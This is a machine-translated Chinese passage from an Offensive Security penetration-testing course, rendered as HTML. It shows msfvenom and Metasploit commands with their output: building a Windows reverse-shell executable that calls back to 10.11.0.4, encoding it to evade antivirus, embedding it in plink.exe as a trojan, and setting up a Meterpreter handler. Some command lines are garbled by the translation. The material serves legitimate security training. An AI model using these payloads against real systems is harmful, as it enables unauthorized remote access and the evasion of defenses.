<div style="position:absolute;top:94229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:94246;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell_reverse.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:94280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择 arch，从有效载荷中选择 arch: x86</font></font></nobr></div>
<div style="position:absolute;top:94297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定编码器或 badchars，输出原始负载</font></font></nobr></div>
<div style="position:absolute;top:94314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：324 字节</font></font></nobr></div>
<div style="position:absolute;top:94331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe文件的最终大小：73802字节</font></font></nobr></div>
<div style="position:absolute;top:94348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另存为：shell_reverse.exe</font></font></nobr></div>
<div style="position:absolute;top:94382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件 shell_reverse.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:94399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell_reverse.exe：PE32 可执行文件 (GUI) Intel 80386，用于 MS Windows</font></font></nobr></div>
<div style="position:absolute;top:94418;left:251"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 772 - 创建一个带有反向 shell 负载的 Windows 可执行文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">嵌入在 PE 文件中的 shellcode 可以使用许多 MSF 编码器中的任何一种进行编码。</font></font></nobr></div>
<div style="position:absolute;top:94467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从历史上看，这有助于逃避防病毒软件，尽管现代 AV 引擎不再如此。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:94487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">encoding 配置了</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指定编码器类型和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来设置所需的数量</font></font></nobr></div>
<div style="position:absolute;top:94506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码迭代。</font><font style="vertical-align: inherit;">我们可以使用多次编码迭代来进一步混淆二进制文件，这</font></font></nobr></div>
<div style="position:absolute;top:94526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以有效地逃避基本的签名检测。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:94577;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:94611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择 arch，从有效载荷中选择 arch: x86</font></font></nobr></div>
<div style="position:absolute;top:94628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 1 个兼容的编码器</font></font></nobr></div>
<div style="position:absolute;top:94645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试使用 x86/shikata_ga_nai 的 9 次迭代对有效载荷进行编码</font></font></nobr></div>
<div style="position:absolute;top:94662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 351（迭代 = 0）</font></font></nobr></div>
<div style="position:absolute;top:94679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 378（迭代=1）</font></font></nobr></div>
<div style="position:absolute;top:94696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 405（迭代 = 2）</font></font></nobr></div>
<div style="position:absolute;top:94713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 432（迭代 = 3）</font></font></nobr></div>
<div style="position:absolute;top:94730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 459（迭代 = 4）</font></font></nobr></div>
<div style="position:absolute;top:94747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 486（迭代=5）</font></font></nobr></div>
<div style="position:absolute;top:94764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 513（迭代 = 6）</font></font></nobr></div>
<div style="position:absolute;top:94781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 540（迭代 = 7）</font></font></nobr></div>
<div style="position:absolute;top:94798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 567（迭代 = 8）</font></font></nobr></div>
<div style="position:absolute;top:94815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 选择最终尺寸 567</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:94832;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：567 字节</font></font></b></nobr></div>
<div style="position:absolute;top:94849;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe文件的最终大小：73802字节</font></font></b></nobr></div>
<div style="position:absolute;top:94865;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另存为：shell_reverse_msf_encoded.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94885;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 773 - 编码反向 shell 负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 的另一个有用功能是能够将有效负载注入现有的 PE 文件中，</font></font></nobr></div>
<div style="position:absolute;top:94934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能会进一步减少 AV 检测的机会。</font><font style="vertical-align: inherit;">注入是通过</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-x</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">完成的</font><font style="vertical-align: inherit;">，指定</font></font></nobr></div>
<div style="position:absolute;top:94953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要注入的文件。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:95087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">715 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Rapid7，2016），https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:95215;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="81"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 81 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:95248;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:96325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:96325;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:96325;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">698</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:95338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.4.1.1</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:95376;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_re</font></font></b></nobr></div>
<div style="position:absolute;top:95393;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">verse_msf_encoded_embedded.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:95427;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[-] 未选择 arch，从有效载荷中选择 arch: x86</font></font></nobr></div>
<div style="position:absolute;top:95444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">找到 1 个兼容的编码器</font></font></nobr></div>
<div style="position:absolute;top:95461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试使用 x86/shikata_ga_nai 的 9 次迭代对有效载荷进行编码</font></font></nobr></div>
<div style="position:absolute;top:95478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 351（迭代 = 0）</font></font></nobr></div>
<div style="position:absolute;top:95495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 378（迭代=1）</font></font></nobr></div>
<div style="position:absolute;top:95512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 405（迭代 = 2）</font></font></nobr></div>
<div style="position:absolute;top:95529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 432（迭代 = 3）</font></font></nobr></div>
<div style="position:absolute;top:95546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 459（迭代 = 4）</font></font></nobr></div>
<div style="position:absolute;top:95563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 486（迭代=5）</font></font></nobr></div>
<div style="position:absolute;top:95580;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 513（迭代 = 6）</font></font></nobr></div>
<div style="position:absolute;top:95597;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 540（迭代 = 7）</font></font></nobr></div>
<div style="position:absolute;top:95614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 成功，大小为 567（迭代 = 8）</font></font></nobr></div>
<div style="position:absolute;top:95631;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x86/shikata_ga_nai 选择最终尺寸 567</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:95648;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：567 字节</font></font></b></nobr></div>
<div style="position:absolute;top:95665;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exe文件的最终大小：311296字节</font></font></b></nobr></div>
<div style="position:absolute;top:95682;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另存为：shell_reverse_msf_encoded_embedded.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95701;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 774 - 在 plink.exe 中嵌入负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95730;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些有效载荷可用作客户端攻击的一部分、后门或独立作为</font></font></nobr></div>
<div style="position:absolute;top:95750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从一台机器到另一台机器的有效载荷的简单方法。</font></font></nobr></div>
<div style="position:absolute;top:95783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当毫无戒心的用户使用我们注入的有效载荷执行二进制文件时，它将正常运行</font></font></nobr></div>
<div style="position:absolute;top:95802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从用户的角度。</font><font style="vertical-align: inherit;">然而，在幕后，注入的有效载荷将尝试</font></font></nobr></div>
<div style="position:absolute;top:95822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接回我们等待的听众。</font></font></nobr></div>
<div style="position:absolute;top:95854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个鲜为人知的秘密是，这个过程也可以在 msfconsole 中使用</font></font></nobr></div>
<div style="position:absolute;top:95873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">例如，我们可以执行以下操作来重新创建之前的 msfvenom</font></font></nobr></div>
<div style="position:absolute;top:95893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用有效载荷/windows/shell_reverse_tcp</font></font></font></b></nobr></div>
<div style="position:absolute;top:95962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 负载（windows/shell_reverse_tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:95979;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:96013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 有效负载（windows/shell_reverse_tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:96030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左端口 =&gt; 443</font></font></nobr></div>
<div style="position:absolute;top:96064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 有效载荷（windows/shell_reverse_tcp）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成 -f exe -e x86/shikata_ga_nai -i 9 -</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:96080;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedde</font></font></b></nobr></div>
<div style="position:absolute;top:96097;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d.exe</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 向 shell_reverse_msf_encoded_embedded.exe 写入 311296 字节...</font></font></nobr></div>
<div style="position:absolute;top:96134;left:251"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 775 - 从 msfconsole 内将有效负载嵌入 plink.exe 中</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:96165;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.5</font></font></i></nobr></div>
<div style="position:absolute;top:96165;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 利用多处理器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96203;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在之前的模块中，我们已经使用 Netcat 来捕获标准的反向 shell，例如那些</font></font></nobr></div>
<div style="position:absolute;top:96222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 windows/shell_reverse_tcp 有效载荷生成。</font><font style="vertical-align: inherit;">但是，这是不雅的，可能不起作用</font></font></nobr></div>
<div style="position:absolute;top:96241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取更高级的 Metasploit 有效载荷。</font><font style="vertical-align: inherit;">相反，我们应该使用框架 multi/handler</font></font></nobr></div>
<div style="position:absolute;top:96261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，适用于所有单级和多级有效载荷。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:96403;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="82"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 82 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:96436;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:97513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:97513;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:97513;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">699</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 multi/handler 模块时，我们必须指定传入的有效负载类型。</font></font></nobr></div>
<div style="position:absolute;top:96565;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的示例中，我们将指示 multi/handler 期望并接受传入的</font></font></nobr></div>
<div style="position:absolute;top:96584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/meterpreter/reverse_https Meterpreter 有效载荷将启动我们的第一阶段侦听器</font></font></nobr></div>
<div style="position:absolute;top:96603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所需的端口，TCP 443。一旦多/处理程序接受第一阶段的有效载荷，第二阶段</font></font></nobr></div>
<div style="position:absolute;top:96623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷的阶段将被反馈到目标机器。</font></font></nobr></div>
<div style="position:absolute;top:96656;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置好参数后，我们将运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exploit</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来指示multi/handler监听一个</font></font></nobr></div>
<div style="position:absolute;top:96675;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联系。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96710;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 multi/handler</font></font></font></b></nobr></div>
<div style="position:absolute;top:96744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置有效载荷 windows/meterpreter/reverse_https</font></font></font></b></nobr></div>
<div style="position:absolute;top:96760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷 =&gt; windows/meterpreter/reverse_https</font></font></nobr></div>
<div style="position:absolute;top:96795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:96829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（exploit/multi/handler）：</font></font></nobr></div>
<div style="position:absolute;top:96862;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:96879;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:96930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载选项（windows/meterpreter/reverse_https）：</font></font></nobr></div>
<div style="position:absolute;top:96964;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:96981;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:96998;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出进程    </font></font></nobr></div>
<div style="position:absolute;top:96998;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 退出技术（接受：'', seh, thread, pro</font></font></nobr></div>
<div style="position:absolute;top:97015;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机    </font></font></nobr></div>
<div style="position:absolute;top:97015;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是本地侦听器主机名</font></font></nobr></div>
<div style="position:absolute;top:97032;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入端口 8443    </font></font></nobr></div>
<div style="position:absolute;top:97032;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 本地监听端口</font></font></nobr></div>
<div style="position:absolute;top:97049;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">卢瑞    </font></font></nobr></div>
<div style="position:absolute;top:97049;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:97049;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 路径</font></font></nobr></div>
<div style="position:absolute;top:97100;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用目标：</font></font></nobr></div>
<div style="position:absolute;top:97134;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证名称</font></font></nobr></div>
<div style="position:absolute;top:97151;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -</font></font></nobr></div>
<div style="position:absolute;top:97168;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 通配符目标</font></font></nobr></div>
<div style="position:absolute;top:97219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:97236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:97270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:97287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左端口 =&gt; 443</font></font></nobr></div>
<div style="position:absolute;top:97321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:97354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 https://10.11.0.4:443 上启动 HTTP 反向处理程序</font></font></nobr></div>
<div style="position:absolute;top:97374;left:282"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 776 - 配置 Metasploit multi/handler 模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，使用</font><font style="vertical-align: inherit;">不带参数</font><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exploit</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令将阻塞命令提示符，直到</font></font></nobr></div>
<div style="position:absolute;top:97423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行结束。</font><font style="vertical-align: inherit;">在大多数情况下，包含</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-j</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志以将模块作为</font></font></nobr></div>
<div style="position:absolute;top:97442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后台作业，允许我们在等待连接的同时继续其他工作。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作</font></font></font></b></nobr></div>
